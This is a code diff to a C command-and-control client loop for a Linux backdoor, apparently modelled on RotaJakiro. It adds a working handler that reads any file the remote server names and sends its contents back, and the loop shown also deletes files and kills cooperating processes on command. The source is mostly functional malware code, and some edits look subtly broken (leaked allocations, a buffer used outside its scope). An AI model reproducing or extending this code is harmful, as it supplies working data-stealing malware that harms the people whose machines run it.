@@ -11,6 +11,7 @@
 #include <sys/utsname.h>
 #include <signal.h>
 #include <sys/shm.h>
+#include <sys/stat.h>
 
 #include "c2_commands.h"
 
@@ -43,57 +44,50 @@ void c2_loop(){
         c2_loop();
     }
 
+    // initial pkt registration
     char *initial_pkt = initial_rota_pkt();
 	send(sock, initial_pkt, 82, 0);
 
+    // interactive c2 loop
     while (1) {
         printf("(%d) In c2 loop...\n", getpid());
 
         // receive
         int n = 0;
-        int len = 0, maxlen = 4096;
+        int len = 0;
+        int maxlen = 65536;
         char buffer[maxlen];
+
+        memset(buffer, 0, maxlen);
 
 	// will remain open until the server terminates the connection
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
-        //pbuffer += n;
         maxlen -= n;
         len += n;
 
-        char *cmd_id = (char *)malloc(2);
+        char *cmd_id = (char *)malloc(4);
         int payload_length;
 
         // zero out cmd id
         memset(cmd_id, 0, 4);
-        memcpy(cmd_id, &buffer[14], 4);
 
         // parse out cmd id
         cmd_id = parse_c2_cmdid(buffer);
         // get payload length
         payload_length = parse_c2_payload_len(buffer);
 
-        char *payload= parse_c2_payload(buffer, payload_length);
+        char *payload = parse_c2_payload(buffer, payload_length);
 
         #ifdef DEBUG
-        printf("Payload length is %d\n", payload_length);
+        printf("\nPayload length is %d\n", payload_length);
+        printf("\nPayload is %s\n", payload);
         #endif
 
-        // exit ==> 0x13 0x8E 0x3E 0x06
         if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run exiting!");
             #endif
             c2_exit(sock);
-        }
-        // perform a "PING"/"PONG" connectivity test
-        else if (memcmp(&rota_c2_test, cmd_id, 4) == 0) {
-            #ifdef DEBUG
-            printf("[+] Rota C2 ping/ping!");
-            #endif
-
-            char *buffer = "PING";
-            build_c2_response(buffer, cmd_id, sock);
-
         }
         else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
             #ifdef DEBUG
@@ -101,6 +95,7 @@ void c2_loop(){
             #endif
             char *buffer = "PING";
             build_c2_response(buffer, cmd_id, sock);
+            break;
 
         }
         else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
@@ -125,6 +120,26 @@ void c2_loop(){
             #ifdef DEBUG
             printf("[+] Rota C2 Run steal sensitive data\n");
             #endif
+            bool result = c2_query_file(payload);
+            if (result == true) {
+
+                FILE *fd = fopen(payload, "r");
+                struct stat stats;
+                stat(payload, &stats);
+
+                char *data = (char *)malloc(stats.st_size);
+                memset(data, 0, stats.st_size);
+
+                fread(data, sizeof(payload[0]), stats.st_size, fd);
+                fclose(fd);
+
+                build_c2_response(data, cmd_id, sock);
+                free(data);
+            } else {
+
+                char *msg = "file does not exist";
+                build_c2_response(msg, cmd_id, sock);
+            }
 
         }
         else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
@@ -187,6 +202,7 @@ void c2_loop(){
 
                     char *msg = "file deleted";
                     build_c2_response(msg, cmd_id, sock);
+                    break;
                 } else {
                     #ifdef DEBUG
                     printf("file deletion of %s was unsuccessful", payload);
@@ -212,14 +228,12 @@ void c2_loop(){
             #ifdef DEBUG
             printf("Unknown command id %s\n", cmd_id);
             #endif
-
-
         }
 
         sleep(sleepy_time);
-        memset(buffer, 0, strlen(buffer));
     }
 
+    memset(buffer, 0, strlen(buffer));
     sleep(sleepy_time);
     }
 
@@ -262,14 +276,26 @@ void c2_exit(int sock) {
     // get pids from sharedmem and kill both pids
     int shmid = shmget(0x64b2e2, 8, 0666);
 
+    // if handled on sharedmem cannot be obtained
+    if (shmid == -1) {
+        #ifdef DEBUG
+        printf("shmget could not find shared mem. Quitting!");
+        #endif
+        exit(0);
+    }
+
+
     int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
     int *tmpPid = (int *)malloc(4);
-    memset(tmpPid, 0, 4);
-    memcpy(tmpPid, shmem_pid_addr, 4);
 
-    kill(*tmpPid, SIGKILL);
+    // Get session-dbus pid from sharedmem and kill it
     memset(tmpPid, 0, 4);
     memcpy(tmpPid, shmem_pid_addr+4, 4);
+    kill(*tmpPid, SIGKILL);
+
+    // Get gvfsd-helper pid from sharedmem  and kill it
+    memset(tmpPid, 0, 4);
+    memcpy(tmpPid, shmem_pid_addr, 4);
     kill(*tmpPid, SIGKILL);
 
     // closing
@@ -447,5 +473,5 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
     memset(&rota_resp_pkt[82], 0, strlen(buffer));
     memcpy(&rota_resp_pkt[82], buffer, buffer_len);
 
-    send(sock, rota_resp_pkt, (82 + buffer_len),0);
+    send(sock, rota_resp_pkt, (82 + buffer_len), 0);
 }
